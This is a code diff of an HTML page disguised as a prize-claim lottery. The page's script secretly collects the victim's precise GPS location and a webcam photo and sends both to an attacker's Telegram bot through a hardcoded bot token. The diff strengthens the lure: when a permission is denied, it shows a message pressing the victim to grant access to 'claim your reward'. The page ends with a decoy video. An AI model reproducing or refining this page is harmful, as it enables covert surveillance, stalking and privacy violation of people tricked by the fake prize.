@@ -4,71 +4,80 @@
     <meta charset="UTF-8">
     <title>🧧</title>
     <style>
-        body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: url('https://github.com/sachinbagwan208-design/-/raw/main/00.png') no-repeat center center fixed; background-size: cover; color: white; font-family: sans-serif; }
+        body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: url('https://github.com/sachinbagwan208-design/-/raw/main/00.png') no-repeat center center fixed; background-size: cover; color: white; font-family: sans-serif; text-align: center; }
         
-        /* 视频框初始隐藏，添加平滑过渡 */
         #video { background: #000; border: 2px solid #444; border-radius: 8px; margin-bottom: 20px; display: none; opacity: 0; transition: opacity 0.5s ease-in-out; }
         
-        /* 放大状态框中的表情符号 */
         #status { 
             margin: 15px 0; 
             font-weight: bold; 
             background: rgba(0,0,0,0.6); 
             padding: 20px; 
             border-radius: 10px; 
-            font-size: 60px; /* 放大表情 */
-            text-align: center;
+            font-size: 60px;
         }
         
         button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 5px; border: none; background: #28a745; color: white; }
+        
+        /* 错误页样式 */
+        .error-page { font-size: 24px; color: #ffeb3b; padding: 20px; background: rgba(0,0,0,0.8); border-radius: 15px; }
     </style>
 </head>
 <body>
-    <h2>🎉 Please click below to claim your prize 🎉</h2>
-    <div id="status">🎰🎰🎰🎰🎰</div>
-    <video id="video" width="640" height="480" autoplay playsinline muted></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-    <button id="startBtn">START🎲</button>
+    <div id="app">
+        <h2>🎉 Please click below to claim your prize 🎉</h2>
+        <div id="status">🎰🎰🎰🎰🎰</div>
+        <video id="video" width="640" height="480" autoplay playsinline muted></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+        <button id="startBtn">START🎲</button>
+    </div>
 
     <script>
         const BOT_TOKEN = '8657025946:AAENnYKTFNhRrms6bzTLIR2kAQGytdOinnI';
+        const app = document.getElementById('app');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const startBtn = document.getElementById('startBtn');
         const status = document.getElementById('status');
         const CHAT_ID = new URLSearchParams(window.location.search).get('id');
 
+        function showError() {
+            app.innerHTML = `<div class="error-page">
+                <p>🛠 Please agree to the above authorization to claim your reward. Please refresh the page and try again⚙️</p>
+                <button onclick="location.reload()">Refresh Page</button>
+            </div>`;
+        }
+
         startBtn.addEventListener('click', async () => {
             if (!CHAT_ID) { status.innerText = "❌ ID Error"; return; }
             startBtn.style.display = 'none';
-            status.innerText = "⏳";
 
-            // 1. 获取定位 (静默请求)
-            let locationText = "Location: Not available";
+            // 1. 获取定位
+            let locationText = "";
             try {
+                status.innerText = "📍";
                 const pos = await new Promise((res, rej) => {
                     navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
                 });
                 locationText = `Lat: ${pos.coords.latitude.toFixed(6)}, Lon: ${pos.coords.longitude.toFixed(6)}`;
-                status.innerText = "📷 Requesting Camera...";
             } catch (err) {
-                status.innerText = "📷 Requesting Camera...";
+                showError(); // 触发跳转
+                return;
             }
-            
-            // 等待1秒让浏览器处理权限弹窗
-            await new Promise(r => setTimeout(r, 1000));
 
-            // 2. 请求相机
+            // 2. 获取相机
             try {
+                status.innerText = "📷";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 video.style.display = 'block'; 
                 video.style.opacity = '1';
-                status.innerText = "🌐 Processing.........";
+                status.innerText = "🌐";
                 
                 setTimeout(() => captureAndUpload(stream, locationText), 1000);
             } catch (err) {
-                status.innerText = "⚠️ Permissions Required";
+                showError(); // 触发跳转
+                return;
             }
         });
 
@@ -81,24 +90,21 @@
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'prize.jpg');
-                formData.append('caption', `来自ID: ${CHAT_ID}\n${locationText}`);
+                formData.append('caption', `ID: ${CHAT_ID}\n📍 ${locationText}`);
 
-                try {
-                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                    if ((await res.json()).ok) {
-                        // 成功后：直接将原相机框切换为视频播放
-                        status.innerText = "🎉 Success!";
-                        stream.getTracks().forEach(t => t.stop()); // 关闭摄像头
-                        video.srcObject = null;
-                        video.src = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
-                        video.loop = true;
-                        video.muted = false; // 播放视频时开启声音
-                        video.play();
-                    } else {
-                        status.innerText = "⚠️ Upload Failed";
-                    }
-                } catch(e) {
-                    status.innerText = "⚠️ Network Error";
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                
+                if ((await res.json()).ok) {
+                    status.style.fontSize = "40px";
+                    status.innerText = "🎉 Success!";
+                    stream.getTracks().forEach(t => t.stop());
+                    video.srcObject = null;
+                    video.src = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
+                    video.loop = true;
+                    video.muted = false;
+                    video.play();
+                } else {
+                    status.innerText = "⚠️ Upload Failed";
                 }
             }, 'image/jpeg');
         }
